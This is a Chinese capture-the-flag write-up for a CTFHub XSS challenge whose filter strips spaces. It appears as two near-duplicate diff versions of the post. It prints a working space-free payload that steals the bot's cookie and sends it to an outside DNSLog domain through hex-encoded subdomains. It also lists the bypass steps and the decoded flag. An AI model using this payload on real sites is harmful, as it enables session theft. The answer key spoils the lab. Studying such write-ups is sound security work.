@@ -14,16 +14,20 @@
## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - XSS 空格过滤 |
| 靶场地址 | `http://challenge-bcc0efec3d9adadc.sandbox.ctfhub.com:10800` |
| 注入位置 | GET 参数 `name` |
| 过滤规则 | 空格被直接删除（不是拦截） |
| 回显位置 | `<h1>Hello, <%-name%></h1>`，未转义 |
| 获取方式 | 无空格 payload 偷 Bot 的 `flag` Cookie |
| Flag | `ctfhub{0df8c389e86310174af59e08}` |
## 0x02 漏洞原理
这是反射型 XSS 的进阶版：页面仍然把 `name` 原样输出到 `<h1>Hello, ...</h1>`，但**服务端会把输入里的空格删掉**。
@@ -109,7 +113,7 @@
- 箭头函数 `c=>...` 也没有空格。
最终的 payload：
```html
<svg/onload="h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');i=document.createElement('img');i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'">
@@ -147,14 +151,18 @@
**3.6 接收并解码**
用 DNSLog 接收（访问 `getdomain.php` 拿域名，访问 `getrecords.php` 看记录）。几秒后拿到：
```text
666c61673d6374666875627b30646638633338396538363331.30313734616635396530387d.q8clvj.dnslog.cn
```
把两段十六进制拼起来解码：
```text
flag=ctfhub{0df8c389e86310174af59e08}
```
@@ -175,16 +183,20 @@
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 找注入点 | `?name=<script>alert(1)</script>` | 原样输出，未转义 |
| 确认过滤 | `?name=<img src=x onerror=...>` | 空格被删，标签失效 |
| 绕过 | `?name=<img/src=x/onerror=alert(1)>` | 正常解析并执行 |
| 构造外带 | `<svg/onload="...document.cookie...">` | 无空格、可执行 |
| 提交给 Bot | `POST /submit` 表单 `url=...` | `code:0 Successfully` |
| 接收 | DNSLog 子域名记录 | 拿到十六进制串 |
| 解码 | 十六进制转 ASCII | `flag=ctfhub{0df8c389e86310174af59e08}` |
整条链路可以概括为：**确认空格被删 → 用 `/` 和 `document.createElement` 写无空格 payload → 提交给 Bot → DNSLog 外带 → 十六进制解码。**
## 0x05 踩坑记录
@@ -232,3 +244,9 @@
真正让这道题完整的是后半段：XSS 只是入口，目标是把 Bot 的 Cookie 外带出来。webhook 不通就换 DNSLog，DNS 大小写不敏感就换十六进制，label 长度有限就拆分——这些细节比 XSS 本身更容易卡人。
防御上，输出编码是根本，CSP 和 HttpOnly 是兜底；只删空格这种黑名单，永远会有下一种写法绕过去。
@@ -14,16 +14,20 @@
## 0x01 题目信息
- **题目名称**：CTFHub 技能学习 - XSS 空格过滤
- **靶场地址**：[沙箱环境](http://challenge-bcc0efec3d9adadc.sandbox.ctfhub.com:10800)
- **注入位置**：GET 参数 `name`
- **过滤规则**：空格被直接删除（不是拦截）
- **回显位置**：`<h1>Hello, <%-name%></h1>`，未转义
- **获取方式**：无空格 payload 偷 Bot 的 `flag` Cookie
- **Flag**：`ctfhub{0df8c389e86310174af59e08}`
## 0x02 漏洞原理
这是反射型 XSS 的进阶版：页面仍然把 `name` 原样输出到 `<h1>Hello, ...</h1>`，但**服务端会把输入里的空格删掉**。
@@ -109,7 +113,7 @@
- 箭头函数 `c=>...` 也没有空格。
最终的 payload（代码块可以左右滑动）：
```html
<svg/onload="h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');i=document.createElement('img');i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'">
@@ -147,14 +151,18 @@
**3.6 接收并解码**
用 DNSLog 接收（访问 `getdomain.php` 拿域名，访问 `getrecords.php` 看记录）。几秒后拿到两段十六进制：
```text
666c61673d6374666875627b30646638633338396538363331
```
```text
30313734616635396530387d
```
把两段拼起来解码：
```text
flag=ctfhub{0df8c389e86310174af59e08}
```
@@ -175,16 +183,20 @@
## 0x04 完整流程
1. **找注入点**：`?name=<script>alert(1)</script>`，原样输出，未转义。
2. **确认过滤**：`?name=<img src=x onerror=...>`，空格被删，标签失效。
3. **绕过**：`?name=<img/src=x/onerror=alert(1)>`，正常解析并执行。
4. **构造外带**：`<svg/onload="...document.cookie...">`，无空格、可执行。
5. **提交给 Bot**：`POST /submit` 表单 `url=...`，返回 `code:0 Successfully`。
6. **接收**：DNSLog 子域名记录，拿到十六进制串。
7. **解码**：十六进制转 ASCII，得到 `flag=ctfhub{0df8c389e86310174af59e08}`。
整条链路可以概括为：**确认空格被删 → 用 `/` 和 `document.createElement` 写无空格 payload → 提交给 Bot → DNSLog 外带 → 十六进制解码。**
## 0x05 踩坑记录
@@ -232,3 +244,9 @@
真正让这道题完整的是后半段：XSS 只是入口，目标是把 Bot 的 Cookie 外带出来。webhook 不通就换 DNSLog，DNS 大小写不敏感就换十六进制，label 长度有限就拆分——这些细节比 XSS 本身更容易卡人。
防御上，输出编码是根本，CSP 和 HttpOnly 是兜底；只删空格这种黑名单，永远会有下一种写法绕过去。
<style>
pre { overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
code { word-break: break-all; }
img { max-width: 100%; height: auto; }
</style>
